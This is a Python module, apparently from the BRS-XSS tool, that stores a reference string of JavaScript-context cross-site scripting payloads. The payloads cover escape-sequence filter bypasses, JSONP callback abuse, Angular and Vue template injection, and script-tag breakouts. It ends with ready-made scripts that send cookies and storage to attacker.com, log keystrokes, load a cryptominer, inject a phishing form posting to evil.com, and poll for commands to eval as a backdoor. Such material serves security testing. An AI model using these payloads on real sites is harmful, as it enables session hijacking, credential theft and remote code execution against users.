#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Refactored
Telegram: https://t.me/easyprotech

JavaScript Context - Advanced Attack Vectors
"""

ADVANCED_ATTACKS = """
ENCODING AND OBFUSCATION BYPASSES:

19. UNICODE ESCAPES:
    <script>var x = \\u0055SER_INPUT;</script>
    
    Payloads:
    \\u0061lert(1)
    \\u0065val(atob('YWxlcnQoMSk='))
    
    Bypass:
    var x = \\u0061lert; x(1);

20. HEX ESCAPES:
    Payload:
    \\x61lert(1)
    \\x65\\x76\\x61\\x6c('alert(1)')

21. OCTAL ESCAPES:
    Payload:
    \\141lert(1)

22. COMMENT TRICKS:
    Payload:
    /**/alert(1)/**/
    1/*comment*/;alert(1);/**/var x=1
    1;alert(1)//rest of line ignored
    1;alert(1)<!--HTML comment also works in JS
    1;alert(1)-->

JSONP EXPLOITATION:

23. CALLBACK MANIPULATION:
    Server: /api/data?callback=USER_INPUT
    Response: USER_INPUT({"data":"value"})
    
    Payloads:
    alert
    alert(1);foo
    alert(1)//
    eval
    Function('alert(1)')()//
    
    Result:
    <script src="/api/data?callback=alert"></script>
    Executes: alert({"data":"value"})

24. JSONP WITH VALIDATION BYPASS:
    If server validates [a-zA-Z0-9_]:
    
    Use existing functions:
    alert
    console.log
    eval
    
    With dots (if allowed):
    console.log
    document.write
    window.alert

FRAMEWORK-SPECIFIC ATTACKS:

25. ANGULAR (v1.x) TEMPLATE INJECTION IN SCRIPT:
    <script>
    var template = '{{USER_INPUT}}';
    </script>
    
    Payload:
    {{constructor.constructor('alert(1)')()}}
    {{$on.constructor('alert(1)')()}}

26. VUE SERVER-SIDE RENDERING:
    <script>
    var app = new Vue({
        data: {value: 'USER_INPUT'}
    });
    </script>
    
    If USER_INPUT reaches template:
    {{constructor.constructor('alert(1)')()}}

27. REACT SSR ESCAPING BYPASS:
    Normally React escapes, but in <script>:
    <script>
    window.__INITIAL_STATE__ = USER_INPUT;
    </script>
    
    If not properly serialized:
    </script><script>alert(1)</script><script>

EXPLOITATION TECHNIQUES:

28. SCRIPT GADGETS:
    Using existing page scripts for exploitation:
    
    If page has:
    <script>
    function loadModule(name) {
        var script = document.createElement('script');
        script.src = '/modules/' + name + '.js';
        document.body.appendChild(script);
    }
    </script>
    
    Inject:
    null; loadModule('../../evil.com/xss'); var x=null

29. BREAKING OUT OF FUNCTIONS:
    <script>
    function process() {
        var data = USER_INPUT;
        return data;
    }
    </script>
    
    Payloads:
    null; } alert(1); function process() { var data=null
    null}};alert(1);process=function(){return null

30. MODULE IMPORTS:
    <script type="module">
    import {func} from 'USER_INPUT';
    </script>
    
    Payload:
    data:text/javascript,alert(1)//

REAL-WORLD ATTACK SCENARIOS:

SESSION HIJACKING:
<script>
var userId = null; 
fetch('//attacker.com/steal?c=' + btoa(document.cookie));
var x = null;
</script>

KEYLOGGER:
<script>
var data = null;
document.addEventListener('keypress', e => {
    fetch('//attacker.com/log?k=' + e.key);
});
var x = null;
</script>

CRYPTOCURRENCY MINING:
<script>
var config = null;
var script = document.createElement('script');
script.src = '//attacker.com/coinhive.min.js';
document.head.appendChild(script);
setTimeout(() => {
    new CoinHive.Anonymous('attacker-key').start();
}, 1000);
var x = null;
</script>

PHISHING PAGE INJECTION:
<script>
var user = null;
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999"><form action="//evil.com/phish" method="POST"><h2>Session Expired</h2><input name="user" placeholder="Username" required><input name="pass" type="password" placeholder="Password" required><button>Login</button></form></div>';
var x = null;
</script>

DATA EXFILTRATION:
<script>
var apiKey = null;
var sensitiveData = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    location: window.location.href,
    referrer: document.referrer
};
fetch('//attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify(sensitiveData)
});
var x = null;
</script>

PERSISTENT BACKDOOR:
<script>
var temp = null;
setInterval(() => {
    fetch('//attacker.com/cmd')
        .then(r => r.text())
        .then(cmd => eval(cmd));
}, 5000);
var x = null;
</script>
"""

